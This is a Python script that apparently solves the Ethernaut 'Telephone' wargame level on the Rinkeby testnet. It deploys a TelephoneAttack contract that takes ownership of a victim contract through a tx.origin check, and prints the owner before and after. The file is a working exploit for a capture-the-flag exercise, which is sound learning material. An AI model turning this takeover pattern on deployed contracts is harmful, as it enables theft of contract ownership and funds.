#!/usr/bin/env python3
import os
from pprint import pprint

import solcx
from web3 import Web3
from web3.middleware import geth_poa_middleware


if __name__ == '__main__':
    solcx.install_solc('0.6.0')

    # Compile the Solidity contracts.
    # https://solcx.readthedocs.io/en/latest/using-the-compiler.html#\
    #     solcx.compile_standard
    # https://docs.soliditylang.org/en/latest/using-the-compiler.html#\
    #     compiler-input-and-output-json-description
    compile_json = {
        'language': 'Solidity',
        'sources': {
            'SafeMath.sol': {
                'urls': ['../SafeMath.sol']
            },
            'Telephone.sol': {
                'urls': ['Telephone.sol']
            },
            'TelephoneAttack.sol': {
                'urls': ['TelephoneAttack.sol']
            }
        },
        'settings': {
            'outputSelection': {
                '*': {
                    '*': ['abi', 'evm.bytecode']
                }
            }
        }
    }
    # Note: SafeMath.sol is not required here! Just included it for practice.

    compiled = solcx.compile_standard(
        input_data=compile_json,
        solc_version='0.6.0',
        allow_paths=['.', '..']
    )

    PLAYER_ADDR = os.environ['PLAYER_ADDR']
    INFURA_ID = os.environ['INFURA_ID']
    PRIV_KEY = os.environ['PRIV_KEY']

    CHAIN_ID = 4  # Rinkeby test network.

    w3 = Web3(Web3.HTTPProvider(f'https://rinkeby.infura.io/v3/{INFURA_ID}'))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    # Input the Instance address.
    VICTIM_ADDR = input('Victim address:')
    VICTIM = w3.eth.contract(
        address=VICTIM_ADDR,
        abi=compiled['contracts']['Telephone.sol']['Telephone']['abi'])

    print(f'Owner #0: {VICTIM.functions.owner().call()}')

    def get_txn():
        return {
            'chainId': CHAIN_ID,
            'from': PLAYER_ADDR,
            'nonce': w3.eth.get_transaction_count(PLAYER_ADDR)
        }

    def transact(txn):
        txn = w3.eth.account.sign_transaction(txn, private_key=PRIV_KEY)
        txn = w3.eth.send_raw_transaction(txn.rawTransaction)
        return w3.eth.wait_for_transaction_receipt(txn)


    # Try #1: Interact with VICTIM directly.
    if False:
        txn = VICTIM.functions.changeOwner(PLAYER_ADDR).buildTransaction(get_txn())
        transact(txn)
        print(f'Owner #1: {VICTIM.functions.owner().call()}')

    # Try #2: Transact with VICTIM through an attack contract.
    ATTACKER = w3.eth.contract(
        abi=compiled['contracts']['TelephoneAttack.sol']['TelephoneAttack']['abi'],
        bytecode=(
            compiled['contracts']['TelephoneAttack.sol'][
                'TelephoneAttack'
            ]['evm']['bytecode']['object'])
    )
    txn = ATTACKER.constructor(VICTIM_ADDR).buildTransaction(get_txn())
    ATTACKER_ADDR = transact(txn).contractAddress
    ATTACKER = w3.eth.contract(
        address=ATTACKER_ADDR,
        abi=compiled['contracts']['TelephoneAttack.sol']['TelephoneAttack']['abi'],
    )
    txn = ATTACKER.functions.attack(PLAYER_ADDR).buildTransaction(get_txn())
    transact(txn)
    print(f'Owner #2: {VICTIM.functions.owner().call()}')

